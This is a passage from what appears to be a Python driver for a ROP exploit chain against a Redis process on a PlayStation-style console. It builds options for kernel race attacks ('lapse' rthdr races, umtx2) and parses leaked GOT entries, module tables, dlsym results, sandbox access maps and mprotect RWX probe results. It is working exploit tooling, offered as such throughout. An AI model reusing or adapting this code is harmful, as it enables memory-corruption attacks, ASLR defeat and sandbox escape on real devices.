    worker_park = bool(args.lapse_worker_park)
    pre_reclaim_send = bool(getattr(args, "lapse_pre_reclaim_send", False))
    pre_delete_send = bool(getattr(args, "lapse_pre_delete_send", False))
    debug_sends = bool(getattr(args, "lapse_debug_sends", False))
    after_ack_send = bool(getattr(args, "lapse_after_ack_send", False))
    main_prio_pin = bool(getattr(args, "lapse_main_prio_pin", False))
    cpuset_size = max(8, min(getattr(args, "lapse_cpuset_size", 8), 0x80))
    timing_segments = post_yields + (1 if (worker_ack or worker_ack_poll_ms) else 0) + (1 if sleep_ns else 0)
    pre_timing_segments = (
        pre_suspend_yields
        + (1 if pre_sleep_ns else 0)
        + pre_suspend_getpid_loops
        + (1 if worker_after_read_ack else 0)
        + post_poll_yields
        + (1 if conn_drain_len else 0)
    )
    rthdr_floor_arg = getattr(args, "lapse_rthdr_segment_floor_override", None)
    rthdr_segment_floor_base = max(0x2D40, min(0x2D80 if rthdr_floor_arg is None else rthdr_floor_arg, 0x3200))

    def align(value, mask):
        return (value + mask) & ~mask

    def compact_rthdr_msg_len():
        segment_stride = 0x60
        sds_off = 0x1A00 if (worker_ack or worker_ready_ack or worker_ready_pipe or worker_after_read_ack) else 0x1900
        set_ret_off = align(sds_off + count * 8, 0x3F)
        get_ret_off = align(set_ret_off + count * 8, 0x3F)
        marker_off = align(get_ret_off + count * 8, 0x3F)
        optlen_off = align(marker_off + count * 8, 0x3F)
        rthdr_buf_off = align(optlen_off + count * 8, 0x7F)
        getbuf_off = rthdr_buf_off + 0x80
        segment_off = max(
            align(getbuf_off + count * 0x80, 0x7F),
            rthdr_segment_floor_base + pre_timing_segments * 0x80,
        )
        segment_count = count + count * set_loops + count + timing_segments
        return align(segment_off + segment_count * segment_stride + 0x80, 0x7F)

    compact_msg_len = compact_rthdr_msg_len()
    if count <= 1:
        stack_size = 0x6000
        msg_offset = 0x2D80
        raw_max = 0x8000
    elif count <= 2:
        if timing_segments or pre_timing_segments or pre_suspend_rop_nops:
            stack_size = 0x7200
            msg_offset = 0x3380
            raw_max = 0xA000
        else:
            stack_size = 0x6000
            msg_offset = 0x2B80
            raw_max = 0x8000
    elif count <= 4:
        if timing_segments <= 2 and set_loops <= 2 and not pre_timing_segments and pre_suspend_rop_nops == 0:
            stack_size = 0x6000
            msg_offset = 0x6000 - compact_msg_len
            raw_max = 0x8000
        else:
            stack_size = 0x7200 if (timing_segments or pre_timing_segments) else 0x6000
            msg_offset = 0x3380 if (timing_segments or pre_timing_segments) else 0x2780
            raw_max = 0xA000 if (timing_segments or pre_timing_segments) else 0x8000
        if set_loops > 1:
            stack_size = max(stack_size, 0x8000 if set_loops <= 4 else 0xA000)
            msg_offset = max(msg_offset, 0x3800 if set_loops <= 4 else 0x4000)
            raw_max = max(raw_max, 0xC000)
    elif count <= 6 and timing_segments <= 2 and set_loops == 1:
        stack_size = 0x6000
        msg_offset = 0x6000 - compact_msg_len
        raw_max = 0x8000
    elif count <= 8:
        stack_size = 0x8000 if (timing_segments or pre_timing_segments) else 0x7200
        msg_offset = 0x4000 if (timing_segments or pre_timing_segments) else 0x3180
        raw_max = 0xC000 if (timing_segments or pre_timing_segments) else 0xA000
        if set_loops > 1:
            stack_size = max(stack_size, 0xB000 if set_loops <= 4 else 0xD000)
            msg_offset = max(msg_offset, 0x5000)
            raw_max = max(raw_max, 0x10000)
    else:
        stack_size = 0xC000 if timing_segments or pre_timing_segments else 0xB000
        msg_offset = 0x6400 if (timing_segments or pre_timing_segments) else 0x5800
        raw_max = 0x16000 if (timing_segments or pre_timing_segments) else 0x14000
        if set_loops > 1:
            stack_size = max(stack_size, 0x18000 if set_loops <= 4 else 0x20000)
            msg_offset = max(msg_offset, 0x9000)
            raw_max = max(raw_max, 0x24000)
    if args.lapse_stack_size_override is not None:
        stack_size = max(0x1000, args.lapse_stack_size_override)
    copy_len = args.lapse_copy_len_override if args.lapse_copy_len_override is not None else stack_size
    copy_len = max(0x1000, copy_len)
    if args.lapse_msg_offset_override is not None:
        msg_offset = max(0x800, args.lapse_msg_offset_override)
    if args.lapse_raw_max_override is not None:
        raw_max = max(0x100, args.lapse_raw_max_override)
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-lapse-race-rthdr",
        "--lowrop-lapse-rthdr-count", str(count),
        "--lowrop-lapse-rthdr-set-loops", str(set_loops),
        "--lowrop-lapse-post-resume-yields", str(post_yields),
        "--lowrop-lapse-post-resume-sleep-ns", str(sleep_ns),
        "--lowrop-lapse-post-resume-rop-nops", str(post_resume_rop_nops),
        "--lowrop-lapse-pre-barrier-yields", str(pre_barrier_yields),
        "--lowrop-lapse-pre-barrier-sleep-ns", str(pre_barrier_sleep_ns),
        "--lowrop-lapse-pre-barrier-getpid-loops", str(pre_barrier_getpid_loops),
        "--lowrop-lapse-pre-barrier-rop-nops", str(pre_barrier_rop_nops),
        "--lowrop-lapse-pre-suspend-rop-nops", str(pre_suspend_rop_nops),
        "--lowrop-lapse-post-poll-rop-nops", str(post_poll_rop_nops),
        "--lowrop-lapse-post-poll-yields", str(post_poll_yields),
        "--lowrop-lapse-client-fill-len", str(client_fill_len),
        "--lowrop-lapse-sockbuf-size", str(sockbuf_size),
        "--lowrop-lapse-conn-drain-len", str(conn_drain_len),
        "--lowrop-lapse-pre-suspend-getpid-loops", str(pre_suspend_getpid_loops),
        "--lowrop-lapse-pre-suspend-yields", str(pre_suspend_yields),
        "--lowrop-lapse-pre-suspend-sleep-ns", str(pre_sleep_ns),
        "--lowrop-lapse-target-req-index", str(max(0, min(getattr(args, "lapse_target_req_index", 2), 2))),
        "--lowrop-lapse-cpuset-size", str(cpuset_size),
        "--stack-size", hex(stack_size),
        "--lowrop-copy-len", hex(copy_len),
        "--lowrop-msg-offset", hex(msg_offset),
        "--dispatch-raw-del-max", hex(raw_max),
    ]
    if getattr(args, "lapse_vtable_offset_override", None) is not None:
        cmd += ["--lowrop-vtable-offset", hex(args.lapse_vtable_offset_override)]
    if getattr(args, "lapse_chain_offset_override", None) is not None:
        cmd += ["--lowrop-chain-offset", hex(args.lapse_chain_offset_override)]
    if getattr(args, "lapse_allow_uncopied_msg_tail", False):
        cmd.append("--lowrop-allow-uncopied-msg-tail")
    if getattr(args, "lapse_truncate_msg_tail", 0):
        cmd += ["--lowrop-truncate-msg-tail", hex(args.lapse_truncate_msg_tail)]
    if getattr(args, "lapse_external_msg", False):
        cmd.append("--lowrop-external-msg")
        cmd += ["--lowrop-external-msg-size", hex(args.lapse_external_msg_size)]
        cmd += ["--lowrop-external-msg-count", str(args.lapse_external_msg_count)]
        cmd += ["--lowrop-external-msg-align", hex(args.lapse_external_msg_align)]
    if worker_ack:
        cmd.append("--lowrop-lapse-worker-ack")
    if worker_ack_poll_ms:
        cmd += ["--lowrop-lapse-worker-ack-poll-ms", str(worker_ack_poll_ms)]
    if getattr(args, "lapse_rthdr_skip_reclaim", False):
        cmd.append("--lowrop-lapse-rthdr-skip-reclaim")
    if getattr(args, "lapse_rthdr_per_socket_setbuf", False):
        cmd.append("--lowrop-lapse-rthdr-per-socket-setbuf")
    if getattr(args, "lapse_rthdr_segment_floor_override", None) is not None:
        cmd += ["--lowrop-lapse-rthdr-segment-floor", hex(rthdr_segment_floor_base)]
    if getattr(args, "lapse_prezero_r9_once", False):
        cmd.append("--lowrop-lapse-prezero-r9-once")
    if getattr(args, "lapse_skip_rthdr_optlen_store", False):
        cmd.append("--lowrop-lapse-skip-rthdr-optlen-store")
    if worker_ready_ack:
        cmd.append("--lowrop-lapse-worker-ready-ack")
    if worker_ready_pipe:
        cmd.append("--lowrop-lapse-worker-ready-pipe")
    if worker_after_read_ack:
        cmd.append("--lowrop-lapse-worker-after-read-ack")
    if worker_park:
        cmd.append("--lowrop-lapse-worker-park")
    if pre_reclaim_send:
        cmd.append("--lowrop-lapse-pre-reclaim-send")
    if getattr(args, "lapse_post_reclaim_send", False):
        cmd.append("--lowrop-lapse-post-reclaim-send")
    if getattr(args, "lapse_post_main_delete_send", False):
        cmd.append("--lowrop-lapse-post-main-delete-send")
    if pre_delete_send:
        cmd.append("--lowrop-lapse-pre-delete-send")
    if getattr(args, "lapse_tcpinfo_before_poll", False):
        cmd.append("--lowrop-lapse-tcpinfo-before-poll")
    if debug_sends:
        cmd.append("--lowrop-lapse-debug-sends")
    if after_ack_send:
        cmd.append("--lowrop-lapse-after-ack-send")
    if getattr(args, "lapse_block_workers", False):
        cmd.append("--lowrop-lapse-block-workers")
        cmd += ["--lowrop-lapse-block-worker-count", str(max(1, min(getattr(args, "lapse_block_worker_count", 2), 2)))]
    if main_prio_pin:
        cmd.append("--lowrop-lapse-main-prio-pin")
    if getattr(args, "lapse_pre_suspend_yield", False) and pre_suspend_yields == 0:
        cmd.append("--lowrop-lapse-pre-suspend-yield")
    return cmd


def build_code_read_command(args, prefix, raw_out, layout_fillers):
    read_len = max(1, min(args.code_read_len, 0x1000))
    msg_len = max(0x80 + read_len, min(args.code_read_msg_len, 0x4000))
    stack_size = 0x1800 if msg_len <= 0x800 else 0x3000
    msg_offset = 0x1000 if stack_size == 0x1800 else 0x2000
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-code-read-probe",
        "--stack-size", hex(stack_size),
        "--lowrop-copy-len", hex(stack_size),
        "--lowrop-msg-offset", hex(msg_offset),
        "--dispatch-raw-del-max", hex(msg_len),
        "--lowrop-code-read-source", args.code_read_source,
        "--lowrop-code-read-flavor", args.code_read_flavor,
        "--lowrop-code-read-adjust", hex(args.code_read_adjust & 0xFFFFFFFFFFFFFFFF),
        "--lowrop-code-read-len", hex(read_len),
        "--lowrop-code-read-msg-len", hex(msg_len),
    ]
    if args.code_read_wrapper_offset is not None:
        cmd += ["--lowrop-code-read-wrapper-offset", hex(args.code_read_wrapper_offset)]
    return cmd


def make_prefix(mode, attempt, token):
    # Keep key-name allocations in the stable class found on the 3.00 Redis
    # target.  PID/decimal-token length changes can move B out of range.
    tag = {
        "send": "s",
        "got-leak": "g",
        "notify": "n",
        "sandbox-probe": "o",
        "libc-gettimeofday": "t",
        "libc-gettimeofday-derive": "u",
        "libc-getpid": "p",
        "libc-getpid-derive": "q",
        "eboot-getpid": "p",
        "eboot-getpid-derive": "q",
        "eboot-gettimeofday": "v",
        "eboot-gettimeofday-derive": "w",
        "eboot-mprotect": "m",
        "eboot-mprotect-derive": "r",
        "module-dlsym-probe": "d",
        "module-table-leak": "t",
        "dynlib-list": "l",
        "self-dlsym-probe": "y",
        "self-info-leak": "i",
        "syscall-wrapper": "p",
        "wrapper-call": "z",
        "direct-syscall": "j",
        "umtx2-preflight": "n",
        "umtx2-race-one": "q",
        "umtx2-spray-existing": "u",
        "lapse-preflight": "x",
        "lapse-thread": "h",
        "lapse-thread-ret": "r",
        "lapse-thread-setcontext": "k",
        "lapse-thread-pivot": "a",
        "lapse-worker": "w",
        "lapse-suspend": "u",
        "lapse-race-one": "e",
        "lapse-race-copy": "b",
        "lapse-rthdr": "g",
        "lapse-race-rthdr": "a",
        "lapse-thread-none": "o",
        "code-read": "c",
    }.get(mode, "x")
    base = f"nrop{tag}{attempt % 100:02d}{token % 1000000000:09d}"
    return (base + "x" * 24)[:24]


def check_send(raw_path):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    ok = data == SEND_MAGIC
    print(f"[check] lowrop-send bytes={data!r} ok={ok}")
    return ok


def check_indirect_send(raw_path):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    ok = data.startswith(b"INDIRECT_SEND_OK\n")
    print(f"[check] indirect-send bytes={data!r} ok={ok}")
    return ok


def check_notify(raw_path):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    ok = data == NOTIFY_MAGIC
    print(f"[check] notify heartbeat bytes={data!r} ok={ok}")
    return ok


def parse_got_leak(raw_path):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    if len(data) < len(GOT_LEAKS) * 8:
        return None, data
    vals = struct.unpack("<" + "Q" * len(GOT_LEAKS), data[:len(GOT_LEAKS) * 8])
    return {name: val for (name, _off), val in zip(GOT_LEAKS, vals)}, data


def print_got_leak(leaks):
    print("[check] got-leak qwords:")
    for name, off in GOT_LEAKS:
        val = leaks.get(name, 0)
        print(f"  {name:14s} GOT+0x{off:X} -> 0x{val:016X}")


def check_got_leak(raw_path):
    leaks, data = parse_got_leak(raw_path)
    if leaks is None:
        print(f"[check] got-leak short read: {len(data)} bytes")
        return False
    print_got_leak(leaks)
    return all(v != 0 for v in leaks.values())


def signed_qword(value):
    return value - (1 << 64) if value & (1 << 63) else value


def signed_u32(value):
    value &= 0xFFFFFFFF
    return value - (1 << 32) if value & 0x80000000 else value


def check_sandbox_probe(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    if len(data) < SANDBOX_PROBE_HEADER_SIZE or not data.startswith(SANDBOX_PROBE_MAGIC):
        print(f"[check] sandbox-probe short/invalid read: {len(data)} bytes")
        return False
    count, record_size = struct.unpack_from("<QQ", data, 0x08)
    count = min(count, args.sandbox_max_paths, 64)
    if record_size < 0x40:
        print(f"[check] sandbox-probe bad record size: 0x{record_size:X}")
        return False
    print(f"[check] sandbox access map count={count} record_size=0x{record_size:X}")
    for i in range(count):
        rec = SANDBOX_PROBE_HEADER_SIZE + i * record_size
        if rec + 0x40 > len(data):
            print(f"  [{i:02d}] truncated record at +0x{rec:X}")
            break
        kind, path_len = struct.unpack_from("<II", data, rec)
        flags, fd_raw, close_raw = struct.unpack_from("<QQQ", data, rec + 0x08)
        path_blob = data[rec + 0x20:rec + min(record_size, 0x80)]
        path = path_blob.split(b"\x00", 1)[0].decode("utf-8", errors="replace")
        fd = signed_u32(fd_raw) if fd_raw <= 0xFFFFFFFF else signed_qword(fd_raw)
        close_ret = signed_u32(close_raw) if close_raw <= 0xFFFFFFFF else signed_qword(close_raw)
        status = "OPEN" if fd >= 0 else "DENY"
        if path_len and path_len != len(path.encode("utf-8", errors="replace")):
            status += "/LEN?"
        print(
            f"  [{i:02d}] {status:9s} kind={kind} flags=0x{flags:X} "
            f"fd={fd} close={close_ret} path={path}"
        )
    return True


def check_dlsym_probe(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    cases = dlsym_cases(args)
    need = 16 * len(cases)
    if len(data) < need:
        print(f"[check] dlsym-probe short read: {len(data)} bytes need={need}")
        return False
    vals = struct.unpack("<" + "Q" * (2 * len(cases)), data[:need])
    found = []
    print("[check] dlsym-probe results:")
    for i, (handle, symbol) in enumerate(cases):
        ret = vals[i * 2]
        ptr = vals[i * 2 + 1]
        ret_signed = signed_qword(ret)
        print(
            f"  handle={handle:>6} symbol={symbol:<16s} "
            f"ret=0x{ret:016X}({ret_signed}) ptr=0x{ptr:016X}"
        )
        if ptr:
            found.append((handle, symbol, ret, ptr))
    if found:
        print("[check] usable dlsym hits:")
        for handle, symbol, ret, ptr in found:
            print(f"  handle={handle} symbol={symbol} ptr=0x{ptr:016X}")
    return bool(found)


def check_module_dlsym_probe(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    cases = module_dlsym_cases(args)
    need = 24 * len(cases)
    if len(data) < need:
        print(f"[check] module-dlsym-probe short read: {len(data)} bytes need={need}")
        return False
    vals = struct.unpack("<" + "Q" * (3 * len(cases)), data[:need])
    found = []
    print("[check] module-dlsym-probe results:")
    for i, (name, symbol) in enumerate(cases):
        handle = vals[i * 3]
        ret = vals[i * 3 + 1]
        ptr = vals[i * 3 + 2]
        handle_signed = signed_qword(handle)
        ret_signed = signed_qword(ret)
        print(
            f"  module={name:<20s} symbol={symbol:<16s} "
            f"handle=0x{handle:016X}({handle_signed}) "
            f"ret=0x{ret:016X}({ret_signed}) ptr=0x{ptr:016X}"
        )
        if ptr:
            found.append((name, symbol, handle, ret, ptr))
    if found:
        print("[check] usable module dlsym hits:")
        for name, symbol, handle, ret, ptr in found:
            print(
                f"  module={name} handle=0x{handle:016X} "
                f"symbol={symbol} ptr=0x{ptr:016X}"
            )
    return bool(found)


def check_module_table_leak(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    entries = max(0, min(args.module_table_entries, 32))
    fields = LIBKERNEL_MODULE_TABLE_FIELDS
    qwords_per_entry = 1 + len(fields)
    need_qwords = 4 + entries * qwords_per_entry
    need = 8 * need_qwords
    if len(data) < need:
        print(f"[check] module-table-leak short read: {len(data)} bytes need={need}")
        return False

    vals = struct.unpack("<" + "Q" * need_qwords, data[:need])
    getpid_ptr, table_addr, count_q, active_q = vals[:4]
    count = count_q & 0xFFFFFFFF
    active = active_q & 0xFFFFFFFF
    print("[check] module-table-leak result:")
    print(f"  flavor={args.module_table_flavor}")
    print(f"  getpid_ptr=0x{getpid_ptr:016X}")
    print(f"  table_addr=0x{table_addr:016X}")
    print(f"  count_q=0x{count_q:016X} count={count}")
    print(f"  active_q=0x{active_q:016X} active={active}")
    print(f"  fields={','.join(f'0x{x:X}' for x in fields)}")

    handles = []
    cursor = 4
    print("  entries:")
    for idx in range(entries):
        entry_addr = vals[cursor]
        cursor += 1
        field_vals = {}
        for field in fields:
            field_vals[field] = vals[cursor]
            cursor += 1
        handle = field_vals[0x10] & 0xFFFFFFFF
        handle_hi = field_vals[0x10] >> 32
        mod_id = field_vals[0x18] & 0xFFFFFFFF
        text_base = field_vals.get(0x48, 0)
        text_size = field_vals.get(0x50, 0) & 0xFFFFFFFF
        data_base = field_vals.get(0x58, 0)
        data_size = field_vals.get(0x60, 0) & 0xFFFFFFFF
        seg_count = field_vals.get(0x68, 0) & 0xFFFFFFFF
        flags = field_vals.get(0x70, 0) & 0xFFFFFFFF
        live = handle not in (0xFFFFFFFF, 0)
        if live:
            handles.append(handle)
        print(
            f"    [{idx:02d}] entry=0x{entry_addr:016X} "
            f"handle=0x{handle:08X}({signed_u32(handle)}) hi=0x{handle_hi:08X} "
            f"id=0x{mod_id:08X} text=0x{text_base:016X}/0x{text_size:X} "
            f"data=0x{data_base:016X}/0x{data_size:X} segs={seg_count} flags=0x{flags:X}"
        )

    if handles:
        unique = []
        for handle in handles:
            if handle not in unique:
                unique.append(handle)
        print("[check] candidate dlsym handles:")
        print("  " + ",".join(f"0x{x:X}" for x in unique))
        print(f"  --dlsym-handles {','.join(hex(x) for x in unique)}")
    else:
        print("[check] no live handles in leaked entries")
    return getpid_ptr != 0 and table_addr != 0 and bool(handles)


def check_dynlib_list(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    max_handles = max(1, min(args.dynlib_list_max, 128))
    header_len = 0x30 if args.dynlib_capture_errno else 0x20
    need = (header_len + max_handles * 4 + 7) & ~7
    if len(data) < need:
        print(f"[check] dynlib-list short read: {len(data)} bytes need={need}")
        return False
    ret, wrapper, count_q = struct.unpack("<QQQ", data[:0x18])
    errno_ptr = errno_q = 0
    if args.dynlib_capture_errno:
        errno_ptr, errno_q = struct.unpack("<QQ", data[0x18:0x28])
    count = count_q & 0xFFFFFFFF
    ret_signed = signed_qword(ret)
    handles = list(struct.unpack("<" + "I" * max_handles, data[header_len:header_len + max_handles * 4]))
    live = [h for h in handles[:min(count, max_handles)] if h not in (0, 0xFFFFFFFF)]
    if not live:
        live = [h for h in handles if h not in (0, 0xFFFFFFFF)]
    unique = []
    for h in live:
        if h not in unique:
            unique.append(h)

    print("[check] dynlib-list result:")
    print(f"  flavor={args.dynlib_flavor}")
    print(f"  order={args.dynlib_list_order}")
    print(f"  ret=0x{ret:016X}({ret_signed})")
    print(f"  wrapper=0x{wrapper:016X}")
    print(f"  count_q=0x{count_q:016X} count={count}")
    if args.dynlib_capture_errno:
        print(f"  errno_ptr=0x{errno_ptr:016X} errno_q=0x{errno_q:016X} errno={errno_q & 0xFFFFFFFF}")
    print(f"  handles(raw first {max_handles}):")
    for i, h in enumerate(handles):
        mark = "*" if h in unique else " "
        print(f"    {mark}[{i:02d}] 0x{h:08X} ({signed_u32(h)})")
    if unique:
        print("[check] candidate dlsym handles:")
        print("  " + ",".join(f"0x{x:X}" for x in unique))
        print(f"  --dlsym-handles {','.join(hex(x) for x in unique)}")
    return ret == 0 and bool(unique)


def check_self_dlsym_probe(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    cases = self_dlsym_cases(args)
    need = 24 * len(cases)
    if len(data) < need:
        print(f"[check] self-dlsym-probe short read: {len(data)} bytes need={need}")
        return False
    vals = struct.unpack("<" + "Q" * (3 * len(cases)), data[:need])
    found = []
    print("[check] self-dlsym-probe results:")
    for i, (flavor, symbol) in enumerate(cases):
        handle = vals[i * 3]
        ret = vals[i * 3 + 1]
        ptr = vals[i * 3 + 2]
        handle_signed = signed_qword(handle)
        ret_signed = signed_qword(ret)
        print(
            f"  flavor={flavor:<6s} symbol={symbol:<16s} "
            f"handle=0x{handle:016X}({handle_signed}) "
            f"ret=0x{ret:016X}({ret_signed}) ptr=0x{ptr:016X}"
        )
        if ptr:
            found.append((flavor, symbol, handle, ret, ptr))
    if found:
        print("[check] usable self dlsym hits:")
        for flavor, symbol, handle, ret, ptr in found:
            print(
                f"  flavor={flavor} handle=0x{handle:016X} "
                f"symbol={symbol} ptr=0x{ptr:016X}"
            )
    return bool(found)


def check_self_info_leak(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    if len(data) < 24:
        print(f"[check] self-info-leak short read: {len(data)} bytes need=24")
        return False
    getpid_ptr, self_global_addr, self_info = struct.unpack("<QQQ", data[:24])
    print("[check] self-info-leak result:")
    print(f"  flavor={args.self_dlsym_flavor}")
    print(f"  getpid_ptr=0x{getpid_ptr:016X}")
    print(f"  self_global_addr=0x{self_global_addr:016X}")
    print(f"  self_info=0x{self_info:016X}")
    if self_info == 0:
        print("  self_info is zero; cached self-module handle path is unavailable")
    return getpid_ptr != 0 and self_global_addr != 0 and self_info != 0


def check_mprotect_probe(raw_path, derive_only=False):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    if len(data) < 16:
        print(f"[check] mprotect-probe short read: {len(data)} bytes")
        return False
    mprotect_ptr, ret = struct.unpack("<QQ", data[:16])
    ret_signed = signed_qword(ret)
    print("[check] mprotect-probe result:")
    print(f"  derived_mprotect=0x{mprotect_ptr:016X}")
    print(f"  ret=0x{ret:016X}({ret_signed})")
    if derive_only:
        print("  derive-only: no syscall was executed")
        return mprotect_ptr != 0
    if ret == 0:
        print("  RWX probe: mprotect accepted PROT_READ|PROT_WRITE|PROT_EXEC")
    else:
        print("  RWX probe: syscall returned an error value; mapping may be blocked or target page invalid")
    return mprotect_ptr != 0


def check_libc_gettimeofday(raw_path, derive_only=False):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    need = 16 if derive_only else 0x28
    if len(data) < need:
        print(f"[check] libc-gettimeofday short read: {len(data)} bytes need={need}")
        return False

    got_addr = struct.unpack("<Q", data[0:8])[0]
    wrapper = struct.unpack("<Q", data[8:16])[0]
    ret = struct.unpack("<Q", data[16:24])[0] if len(data) >= 24 else 0
    ret_signed = signed_qword(ret)
    print("[check] libc gettimeofday wrapper result:")
    print(f"  libc_gettimeofday_got_addr=0x{got_addr:016X}")
    print(f"  gettimeofday_wrapper=0x{wrapper:016X}")
    if not derive_only:
        print(f"  ret=0x{ret:016X}({ret_signed})")
        if len(data) >= 0x28:
            tv_sec, tv_usec = struct.unpack("<QQ", data[0x18:0x28])
            print(f"  timeval={{sec={tv_sec}, usec={tv_usec}}}")

    candidates = [
        ("libkernel.prx", LIBKERNEL_GETTIMEOFDAY, 0x730),
        ("libkernel_sys.prx", LIBKERNEL_SYS_GETTIMEOFDAY, 0x900),
    ]
    print("  candidates from wrapper:")
    for image, gtod_off, mprotect_off in candidates:
        raw_base = wrapper - gtod_off if wrapper else 0
        page_base = raw_base & ~(LIB_PAGE_SIZE - 1) if wrapper else 0
        page_delta = raw_base - page_base if wrapper else 0
        mprotect = wrapper - gtod_off + mprotect_off if wrapper else 0
        print(
            f"    {image}: raw_base=0x{raw_base:016X} page_base=0x{page_base:016X} "
            f"page_delta=0x{page_delta:X} mprotect=0x{mprotect:016X}"
        )
    if derive_only:
        print("  derive-only: gettimeofday was not executed")
        return got_addr != 0 and wrapper != 0
    return got_addr != 0 and wrapper != 0 and ret == 0


def check_libc_getpid(raw_path, derive_only=False):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    need = 16 if derive_only else 24
    if len(data) < need:
        print(f"[check] libc-getpid short read: {len(data)} bytes need={need}")
        return False

    got_addr, wrapper = struct.unpack("<QQ", data[:16])
    pid_ret = struct.unpack("<Q", data[16:24])[0] if len(data) >= 24 else 0
    print("[check] libc getpid wrapper result:")
    print(f"  libc_getpid_got_addr=0x{got_addr:016X}")
    print(f"  getpid_wrapper=0x{wrapper:016X}")
    if not derive_only:
        print(f"  getpid_ret=0x{pid_ret:016X}({signed_qword(pid_ret)})")

    candidates = [
        ("libkernel.prx", LIBKERNEL_GETPID, 0x730),
        ("libkernel_sys.prx", LIBKERNEL_SYS_GETPID, 0x900),
    ]
    print("  candidates from wrapper:")
    for image, getpid_off, mprotect_off in candidates:
        raw_base = wrapper - getpid_off if wrapper else 0
        page_base = raw_base & ~(LIB_PAGE_SIZE - 1) if wrapper else 0
        page_delta = raw_base - page_base if wrapper else 0
        mprotect = wrapper - getpid_off + mprotect_off if wrapper else 0
        print(
            f"    {image}: raw_base=0x{raw_base:016X} page_base=0x{page_base:016X} "
            f"page_delta=0x{page_delta:X} mprotect=0x{mprotect:016X}"
        )
    if derive_only:
        print("  derive-only: getpid was not executed")
        return got_addr != 0 and wrapper != 0
    return got_addr != 0 and wrapper != 0 and 0 < pid_ret < 0x100000


def check_eboot_getpid(raw_path, derive_only=False):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    need = 8 if derive_only else 16
    if len(data) < need:
        print(f"[check] eboot-getpid short read: {len(data)} bytes need={need}")
        return False
    wrapper = struct.unpack("<Q", data[:8])[0]
    pid_ret = struct.unpack("<Q", data[8:16])[0] if len(data) >= 16 else 0
    print("[check] eboot GOT getpid result:")
    print(f"  redis_getpid_got=0x{REDIS_EBOOT_GETPID_GOT:X}")
    print(f"  getpid_wrapper=0x{wrapper:016X}")
    if not derive_only:
        print(f"  getpid_ret=0x{pid_ret:016X}({signed_qword(pid_ret)})")
    print("  candidates from wrapper:")
    for image, getpid_off, mprotect_off in [
        ("libkernel.prx", LIBKERNEL_GETPID, 0x730),
        ("libkernel_sys.prx", LIBKERNEL_SYS_GETPID, 0x900),
    ]:
        raw_base = wrapper - getpid_off if wrapper else 0
        page_base = raw_base & ~(LIB_PAGE_SIZE - 1) if wrapper else 0
        page_delta = raw_base - page_base if wrapper else 0
        mprotect = wrapper - getpid_off + mprotect_off if wrapper else 0
        print(
            f"    {image}: raw_base=0x{raw_base:016X} page_base=0x{page_base:016X} "
            f"page_delta=0x{page_delta:X} mprotect=0x{mprotect:016X}"
        )
    return wrapper != 0 if derive_only else wrapper != 0 and 0 < pid_ret < 0x100000


def check_eboot_gettimeofday(raw_path, derive_only=False):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    need = 8 if derive_only else 0x20
    if len(data) < need:
        print(f"[check] eboot-gettimeofday short read: {len(data)} bytes need={need}")
        return False
    wrapper = struct.unpack("<Q", data[:8])[0]
    ret = struct.unpack("<Q", data[8:16])[0] if len(data) >= 16 else 0
    print("[check] eboot GOT gettimeofday result:")
    print(f"  redis_gettimeofday_got=0x{REDIS_EBOOT_GETTIMEOFDAY_GOT:X}")
    print(f"  gettimeofday_wrapper=0x{wrapper:016X}")
    if not derive_only:
        print(f"  ret=0x{ret:016X}({signed_qword(ret)})")
        if len(data) >= 0x20:
            tv_sec, tv_usec = struct.unpack("<QQ", data[0x10:0x20])
            print(f"  timeval={{sec={tv_sec}, usec={tv_usec}}}")
    print("  candidates from wrapper:")
    for image, gtod_off, mprotect_off in [
        ("libkernel.prx", LIBKERNEL_GETTIMEOFDAY, 0x730),
        ("libkernel_sys.prx", LIBKERNEL_SYS_GETTIMEOFDAY, 0x900),
    ]:
        raw_base = wrapper - gtod_off if wrapper else 0
        page_base = raw_base & ~(LIB_PAGE_SIZE - 1) if wrapper else 0
        page_delta = raw_base - page_base if wrapper else 0
        mprotect = wrapper - gtod_off + mprotect_off if wrapper else 0
        print(
            f"    {image}: raw_base=0x{raw_base:016X} page_base=0x{page_base:016X} "
            f"page_delta=0x{page_delta:X} mprotect=0x{mprotect:016X}"
        )
    return wrapper != 0 if derive_only else wrapper != 0 and ret == 0


def check_eboot_mprotect(raw_path, derive_only=False):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    need = 16 if derive_only else 24
    if len(data) < need:
        print(f"[check] eboot-mprotect short read: {len(data)} bytes need={need}")
        return False
    getpid_wrapper, mprotect_ptr = struct.unpack("<QQ", data[:16])
    ret = struct.unpack("<Q", data[16:24])[0] if len(data) >= 24 else 0
    print("[check] eboot-derived mprotect result:")
    print(f"  getpid_wrapper=0x{getpid_wrapper:016X}")
    print(f"  derived_mprotect=0x{mprotect_ptr:016X}")
    if not derive_only:
        print(f"  ret=0x{ret:016X}({signed_qword(ret)})")
        if len(data) >= 40:
            errno_ptr, errno_qword = struct.unpack("<QQ", data[24:40])
            errno_value = errno_qword & 0xFFFFFFFF
            print(f"  errno_ptr=0x{errno_ptr:016X}")
            print(f"  errno=0x{errno_value:08X}({errno_value}) raw=0x{errno_qword:016X}")
        if ret == 0:
            print("  mprotect accepted requested protection")
        else:
            print("  mprotect returned nonzero; target/protection may be blocked or flavor may be wrong")
    return getpid_wrapper != 0 and mprotect_ptr != 0 if derive_only else getpid_wrapper != 0 and mprotect_ptr != 0 and ret == 0


def check_wrapper_call(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
